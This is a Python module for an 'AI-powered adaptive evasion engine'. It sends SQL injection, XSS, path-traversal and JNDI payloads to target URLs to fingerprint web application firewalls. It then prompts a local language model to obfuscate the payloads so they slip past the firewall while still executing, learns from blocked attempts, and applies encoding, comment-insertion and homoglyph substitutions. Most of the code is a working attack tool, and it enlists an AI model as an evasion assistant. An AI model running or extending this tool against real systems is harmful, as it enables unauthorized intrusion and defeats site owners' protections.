"""
AI-Powered Adaptive Evasion Engine
Learns from WAF responses and dynamically adjusts attack vectors
"""

import json
import re
import asyncio
import hashlib
from typing import Dict, List, Optional, Tuple, Set
from dataclasses import dataclass
from enum import Enum
import aiohttp
import logging
from datetime import datetime, timedelta
from ..core.base_component import BaseComponent

logger = logging.getLogger(__name__)

class EvasionTechnique(Enum):
    ENCODING = "encoding"
    OBFUSCATION = "obfuscation"
    FRAGMENTATION = "fragmentation"
    TIMING_MANIPULATION = "timing_manipulation"
    PROTOCOL_SWITCHING = "protocol_switching"
    CASE_VARIATION = "case_variation"
    COMMENT_INSERTION = "comment_insertion"
    WHITESPACE_MANIPULATION = "whitespace_manipulation"
    UNICODE_NORMALIZATION = "unicode_normalization"
    DOUBLE_ENCODING = "double_encoding"

class WAFType(Enum):
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    AZURE_WAF = "azure_waf"
    IMPERVA = "imperva"
    F5_ASM = "f5_asm"
    MODSECURITY = "modsecurity"
    AKAMAI = "akamai"
    BARRACUDA = "barracuda"
    FORTINET = "fortinet"
    UNKNOWN = "unknown"

@dataclass
class EvasionAttempt:
    original_payload: str
    modified_payload: str
    technique: EvasionTechnique
    success: bool
    response_code: int
    response_body: str
    response_headers: Dict[str, str]
    waf_detected: bool
    waf_signature: str
    timestamp: datetime

@dataclass
class WAFFingerprint:
    waf_type: WAFType
    version: str
    detection_patterns: List[str]
    block_signatures: List[str]
    bypass_techniques: List[EvasionTechnique]
    confidence: float

class AIAdaptiveEvasion(BaseComponent):
    """
    AI-powered adaptive evasion engine that:
    1. Fingerprints WAF systems automatically
    2. Learns from blocked/successful requests
    3. Adapts payloads in real-time
    4. Maintains evasion technique database
    5. Predicts optimal bypass methods
    """
    
    def __init__(self, config: Dict):
        super().__init__("AIAdaptiveEvasion", config)
        self.ai_endpoint = config.get('ai_endpoint', 'http://localhost:11434')
        self.model_name = config.get('model_name', 'llama2')
        
        # Learning databases
        self.evasion_history: List[EvasionAttempt] = []
        self.waf_fingerprints: Dict[str, WAFFingerprint] = {}
        self.successful_techniques: Dict[str, List[EvasionTechnique]] = {}
        self.blocked_patterns: Set[str] = set()
        
        # Technique effectiveness tracking
        self.technique_success_rates: Dict[EvasionTechnique, float] = {}
        
        # Learning parameters
        self.learning_threshold = 0.7
        self.adaptation_window = timedelta(hours=24)
    
    def initialize(self) -> bool:
        """Initialize the AI adaptive evasion engine"""
        logger.info("AI Adaptive Evasion Engine initialized")
        self.is_initialized = True
        return True
        
    def cleanup(self) -> bool:
        """Clean up resources"""
        logger.info("AI Adaptive Evasion Engine cleanup completed")
        return True
        
    async def fingerprint_waf(self, target_url: str) -> WAFFingerprint:
        """
        AI-powered WAF fingerprinting using response analysis
        """
        try:
            # Send test payloads to identify WAF
            test_payloads = self._get_waf_fingerprint_payloads()
            responses = []
            
            for payload in test_payloads:
                response = await self._send_test_request(target_url, payload)
                responses.append(response)
            
            # AI analysis of responses to identify WAF
            fingerprint_prompt = self._create_waf_fingerprint_prompt(responses)
            ai_response = await self._query_ai_model(fingerprint_prompt)
            
            fingerprint = await self._parse_waf_fingerprint(ai_response)
            
            # Store fingerprint for future use
            domain = self._extract_domain(target_url)
            self.waf_fingerprints[domain] = fingerprint
            
            return fingerprint
            
        except Exception as e:
            logger.error(f"WAF fingerprinting failed: {e}")
            return WAFFingerprint(WAFType.UNKNOWN, "", [], [], [], 0.0)
    
    def _get_waf_fingerprint_payloads(self) -> List[str]:
        """
        Get standardized payloads for WAF fingerprinting
        """
        return [
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../../../etc/passwd",
            "'; DROP TABLE users; --",
            "<img src=x onerror=alert(1)>",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "' UNION SELECT 1,2,3 --",
            "../../../windows/system32/drivers/etc/hosts",
            "javascript:alert('xss')"
        ]
    
    async def _send_test_request(self, url: str, payload: str) -> Dict:
        """
        Send test request and capture detailed response
        """
        try:
            async with aiohttp.ClientSession() as session:
                # Test both GET and POST
                responses = {}
                
                # GET request
                async with session.get(f"{url}?test={payload}") as response:
                    responses['GET'] = {
                        'status': response.status,
                        'headers': dict(response.headers),
                        'body': await response.text()
                    }
                
                # POST request
                data = {'test': payload}
                async with session.post(url, data=data) as response:
                    responses['POST'] = {
                        'status': response.status,
                        'headers': dict(response.headers),
                        'body': await response.text()
                    }
                
                return responses
                
        except Exception as e:
            logger.error(f"Test request failed: {e}")
            return {}
    
    def _create_waf_fingerprint_prompt(self, responses: List[Dict]) -> str:
        """
        Create AI prompt for WAF fingerprinting
        """
        return f"""
        You are an expert web application firewall (WAF) analyst. Analyze these HTTP responses to identify the WAF system.
        
        TEST RESPONSES:
        {json.dumps(responses, indent=2)}
        
        ANALYSIS REQUIRED:
        1. Identify the WAF type (Cloudflare, AWS WAF, Azure WAF, Imperva, F5 ASM, ModSecurity, Akamai, etc.)
        2. Determine version if possible
        3. Identify detection patterns and signatures
        4. Note blocking behavior and response characteristics
        5. Assess confidence level in identification
        
        WAF IDENTIFICATION INDICATORS:
        - Cloudflare: "cf-ray" header, specific error pages, "cloudflare" in response
        - AWS WAF: "x-amzn-requestid" header, AWS error formats
        - Azure WAF: "x-azure-ref" header, Microsoft error pages
        - Imperva: "X-Iinfo" header, specific block pages
        - F5 ASM: "X-WA-Info" header, F5 signatures
        - ModSecurity: "Mod_Security" in headers/errors
        - Akamai: "x-akamai-*" headers, Akamai error pages
        
        DETECTION PATTERNS TO NOTE:
        - Specific error messages
        - HTTP status codes used for blocking
        - Response headers that indicate WAF presence
        - HTML content patterns in block pages
        - Timing characteristics
        
        Return as JSON:
        {{
            "waf_type": "cloudflare",
            "version": "unknown",
            "confidence": 0.95,
            "detection_patterns": ["cf-ray header present", "cloudflare error page"],
            "block_signatures": ["403 status", "Access denied message"],
            "bypass_techniques": ["encoding", "case_variation", "fragmentation"]
        }}
        """
    
    async def _parse_waf_fingerprint(self, ai_response: str) -> WAFFingerprint:
        """
        Parse AI response into WAFFingerprint object
        """
        try:
            json_match = re.search(r'\{.*\}', ai_response, re.DOTALL)
            if json_match:
                fingerprint_data = json.loads(json_match.group())
                
                waf_type_str = fingerprint_data.get('waf_type', 'unknown')
                waf_type = WAFType(waf_type_str) if waf_type_str in [w.value for w in WAFType] else WAFType.UNKNOWN
                
                bypass_techniques = []
                for tech in fingerprint_data.get('bypass_techniques', []):
                    if tech in [t.value for t in EvasionTechnique]:
                        bypass_techniques.append(EvasionTechnique(tech))
                
                return WAFFingerprint(
                    waf_type=waf_type,
                    version=fingerprint_data.get('version', ''),
                    detection_patterns=fingerprint_data.get('detection_patterns', []),
                    block_signatures=fingerprint_data.get('block_signatures', []),
                    bypass_techniques=bypass_techniques,
                    confidence=fingerprint_data.get('confidence', 0.0)
                )
        except Exception as e:
            logger.error(f"Failed to parse WAF fingerprint: {e}")
        
        return WAFFingerprint(WAFType.UNKNOWN, "", [], [], [], 0.0)
    
    async def adapt_payload(self, original_payload: str, target_url: str, previous_attempts: List[EvasionAttempt] = None) -> str:
        """
        AI-powered adaptive payload modification
        """
        try:
            domain = self._extract_domain(target_url)
            waf_fingerprint = self.waf_fingerprints.get(domain)
            
            # Analyze previous attempts for this target
            failed_attempts = [attempt for attempt in (previous_attempts or []) if not attempt.success]
            
            # Create adaptation prompt
            adaptation_prompt = self._create_adaptation_prompt(
                original_payload, 
                waf_fingerprint, 
                failed_attempts
            )
            
            ai_response = await self._query_ai_model(adaptation_prompt)
            
            # Parse and apply recommended techniques
            adapted_payload = await self._apply_adaptation_techniques(original_payload, ai_response)
            
            return adapted_payload
            
        except Exception as e:
            logger.error(f"Payload adaptation failed: {e}")
            return original_payload
    
    def _create_adaptation_prompt(self, payload: str, waf_fingerprint: Optional[WAFFingerprint], failed_attempts: List[EvasionAttempt]) -> str:
        """
        Create AI prompt for payload adaptation
        """
        waf_info = ""
        if waf_fingerprint:
            waf_info = f"""
            WAF INFORMATION:
            - Type: {waf_fingerprint.waf_type.value}
            - Version: {waf_fingerprint.version}
            - Known bypass techniques: {[t.value for t in waf_fingerprint.bypass_techniques]}
            - Detection patterns: {waf_fingerprint.detection_patterns}
            """
        
        failed_info = ""
        if failed_attempts:
            failed_info = f"""
            FAILED ATTEMPTS:
            {json.dumps([{
                'payload': attempt.modified_payload,
                'technique': attempt.technique.value,
                'response': attempt.response_body[:200]
            } for attempt in failed_attempts[-5:]], indent=2)}
            """
        
        return f"""
        You are an expert payload obfuscation specialist. Adapt this payload to bypass WAF detection.
        
        ORIGINAL PAYLOAD: {payload}
        
        {waf_info}
        
        {failed_info}
        
        AVAILABLE EVASION TECHNIQUES:
        1. ENCODING: URL encoding, HTML encoding, Base64, Hex encoding
        2. OBFUSCATION: String concatenation, variable substitution, function calls
        3. CASE_VARIATION: Mixed case, alternating case patterns
        4. COMMENT_INSERTION: SQL comments, HTML comments, JavaScript comments
        5. WHITESPACE_MANIPULATION: Tabs, newlines, multiple spaces
        6. UNICODE_NORMALIZATION: Unicode equivalents, homoglyphs
        7. DOUBLE_ENCODING: Multiple layers of encoding
        8. FRAGMENTATION: Split payload across multiple parameters
        9. PROTOCOL_SWITCHING: HTTP to HTTPS, different methods
        10. TIMING_MANIPULATION: Delays, out-of-order requests
        
        REQUIREMENTS:
        1. Maintain payload functionality
        2. Use techniques likely to bypass the identified WAF
        3. Avoid patterns that previously failed
        4. Combine multiple techniques if necessary
        5. Ensure payload remains executable
        
        SPECIFIC EVASION STRATEGIES:
        - For SQL injection: Use alternative syntax, comments, encoding
        - For XSS: Use event handlers, encoding, DOM manipulation
        - For command injection: Use variable expansion, alternative commands
        - For path traversal: Use encoding, alternative path separators
        
        Return adapted payload and explain the techniques used:
        {{
            "adapted_payload": "modified payload here",
            "techniques_used": ["encoding", "case_variation"],
            "explanation": "Applied URL encoding and mixed case to evade signature detection"
        }}
        """
    
    async def _apply_adaptation_techniques(self, original_payload: str, ai_response: str) -> str:
        """
        Apply AI-recommended adaptation techniques
        """
        try:
            json_match = re.search(r'\{.*\}', ai_response, re.DOTALL)
            if json_match:
                adaptation_data = json.loads(json_match.group())
                adapted_payload = adaptation_data.get('adapted_payload', original_payload)
                
                # Validate that the adapted payload is different and functional
                if adapted_payload != original_payload and len(adapted_payload) > 0:
                    return adapted_payload
        except Exception as e:
            logger.error(f"Failed to apply adaptation techniques: {e}")
        
        # Fallback: apply basic encoding
        return self._apply_basic_evasion(original_payload)
    
    def _apply_basic_evasion(self, payload: str) -> str:
        """
        Apply basic evasion techniques as fallback
        """
        import urllib.parse
        
        # Simple URL encoding
        encoded = urllib.parse.quote(payload, safe='')
        
        # Add case variation for SQL keywords
        sql_keywords = ['SELECT', 'UNION', 'WHERE', 'FROM', 'INSERT', 'UPDATE', 'DELETE', 'DROP']
        for keyword in sql_keywords:
            if keyword in payload.upper():
                # Mix case
                mixed_case = ''.join([c.lower() if i % 2 else c.upper() for i, c in enumerate(keyword)])
                encoded = encoded.replace(keyword, mixed_case)
        
        return encoded
    
    async def learn_from_attempt(self, attempt: EvasionAttempt):
        """
        Learn from evasion attempt results
        """
        # Store attempt in history
        self.evasion_history.append(attempt)
        
        # Update technique success rates
        if attempt.technique in self.technique_success_rates:
            current_rate = self.technique_success_rates[attempt.technique]
            # Exponential moving average
            self.technique_success_rates[attempt.technique] = 0.8 * current_rate + 0.2 * (1.0 if attempt.success else 0.0)
        else:
            self.technique_success_rates[attempt.technique] = 1.0 if attempt.success else 0.0
        
        # Update blocked patterns
        if not attempt.success:
            pattern_hash = hashlib.md5(attempt.modified_payload.encode()).hexdigest()
            self.blocked_patterns.add(pattern_hash)
        
        # AI-powered learning analysis
        if len(self.evasion_history) % 10 == 0:  # Analyze every 10 attempts
            await self._analyze_learning_patterns()
    
    async def _analyze_learning_patterns(self):
        """
        AI-powered analysis of learning patterns
        """
        recent_attempts = self.evasion_history[-50:]  # Last 50 attempts
        
        learning_prompt = f"""
        Analyze these evasion attempts to identify patterns and improve future evasion strategies:
        
        RECENT ATTEMPTS:
        {json.dumps([{
            'payload': attempt.modified_payload,
            'technique': attempt.technique.value,
            'success': attempt.success,
            'waf_detected': attempt.waf_detected,
            'response_code': attempt.response_code
        } for attempt in recent_attempts], indent=2)}
        
        ANALYSIS REQUIRED:
        1. Which techniques are most effective?
        2. What patterns consistently get blocked?
        3. Are there technique combinations that work better?
        4. What timing patterns improve success rates?
        5. Which payload characteristics should be avoided?
        
        PROVIDE RECOMMENDATIONS:
        1. Priority order of techniques to try
        2. Patterns to avoid in future payloads
        3. Optimal timing strategies
        4. Technique combinations that work well together
        
        Return as JSON with actionable insights.
        """
        
        ai_response = await self._query_ai_model(learning_prompt)
        
        try:
            json_match = re.search(r'\{.*\}', ai_response, re.DOTALL)
            if json_match:
                insights = json.loads(json_match.group())
                
                # Update technique priorities based on insights
                technique_priorities = insights.get('technique_priorities', [])
                for i, tech_name in enumerate(technique_priorities):
                    if tech_name in [t.value for t in EvasionTechnique]:
                        technique = EvasionTechnique(tech_name)
                        # Higher priority = higher success rate estimate
                        self.technique_success_rates[technique] = 1.0 - (i * 0.1)
                
                logger.info(f"Updated evasion strategies based on AI analysis: {insights}")
        except Exception as e:
            logger.error(f"Failed to analyze learning patterns: {e}")
    
    async def get_optimal_evasion_sequence(self, payload: str, target_url: str) -> List[Tuple[str, EvasionTechnique]]:
        """
        Get optimal sequence of evasion attempts based on learning
        """
        domain = self._extract_domain(target_url)
        waf_fingerprint = self.waf_fingerprints.get(domain)
        
        # Sort techniques by success rate
        sorted_techniques = sorted(
            self.technique_success_rates.items(),
            key=lambda x: x[1],
            reverse=True
        )
        
        # Generate sequence of adapted payloads
        sequence = []
        current_payload = payload
        
        for technique, success_rate in sorted_techniques[:5]:  # Top 5 techniques
            if success_rate > 0.3:  # Only use techniques with reasonable success rate
                adapted = await self._apply_specific_technique(current_payload, technique)
                sequence.append((adapted, technique))
        
        return sequence
    
    async def _apply_specific_technique(self, payload: str, technique: EvasionTechnique) -> str:
        """
        Apply a specific evasion technique to payload
        """
        import urllib.parse
        import base64
        import html
        
        if technique == EvasionTechnique.ENCODING:
            return urllib.parse.quote(payload, safe='')
        
        elif technique == EvasionTechnique.DOUBLE_ENCODING:
            encoded_once = urllib.parse.quote(payload, safe='')
            return urllib.parse.quote(encoded_once, safe='')
        
        elif technique == EvasionTechnique.CASE_VARIATION:
            return ''.join([c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)])
        
        elif technique == EvasionTechnique.COMMENT_INSERTION:
            if 'SELECT' in payload.upper():
                return payload.replace(' ', '/**/ ')
            elif '<script>' in payload.lower():
                return payload.replace('<script>', '<script/*comment*/>').replace('</script>', '</script/*comment*/>')
            return payload
        
        elif technique == EvasionTechnique.WHITESPACE_MANIPULATION:
            return payload.replace(' ', '\t').replace('=', ' = ')
        
        elif technique == EvasionTechnique.UNICODE_NORMALIZATION:
            # Replace common characters with Unicode equivalents
            replacements = {
                'a': 'а',  # Cyrillic 'a'
                'o': 'о',  # Cyrillic 'o'
                'e': 'е',  # Cyrillic 'e'
            }
            result = payload
            for ascii_char, unicode_char in replacements.items():
                result = result.replace(ascii_char, unicode_char)
            return result
        
        else:
            return payload
    
    def _extract_domain(self, url: str) -> str:
        """
        Extract domain from URL
        """
        from urllib.parse import urlparse
        parsed = urlparse(url)
        return parsed.netloc
    
    async def _query_ai_model(self, prompt: str) -> str:
        """
        Query AI model for analysis
        """
        try:
            async with aiohttp.ClientSession() as session:
                payload = {
                    "model": self.model_name,
                    "prompt": prompt,
                    "stream": False
                }
                
                async with session.post(f"{self.ai_endpoint}/api/generate", json=payload) as response:
                    if response.status == 200:
                        result = await response.json()
                        return result.get('response', '')
                    else:
                        logger.error(f"AI model query failed: {response.status}")
                        return ""
        except Exception as e:
            logger.error(f"AI model connection failed: {e}")
            return ""
    
    def get_evasion_statistics(self) -> Dict:
        """
        Get comprehensive evasion statistics
        """
        total_attempts = len(self.evasion_history)
        successful_attempts = len([a for a in self.evasion_history if a.success])
        
        technique_stats = {}
        for technique in EvasionTechnique:
            technique_attempts = [a for a in self.evasion_history if a.technique == technique]
            technique_successes = [a for a in technique_attempts if a.success]
            
            technique_stats[technique.value] = {
                'attempts': len(technique_attempts),
                'successes': len(technique_successes),
                'success_rate': len(technique_successes) / len(technique_attempts) if technique_attempts else 0
            }
        
        return {
            'total_attempts': total_attempts,
            'successful_attempts': successful_attempts,
            'overall_success_rate': successful_attempts / total_attempts if total_attempts else 0,
            'technique_statistics': technique_stats,
            'blocked_patterns_count': len(self.blocked_patterns),
            'identified_wafs': len(self.waf_fingerprints)
        }

# Factory function
def create_ai_adaptive_evasion(config: Dict) -> AIAdaptiveEvasion:
    """
    Factory function to create AI adaptive evasion engine
    """
    return AIAdaptiveEvasion(config)
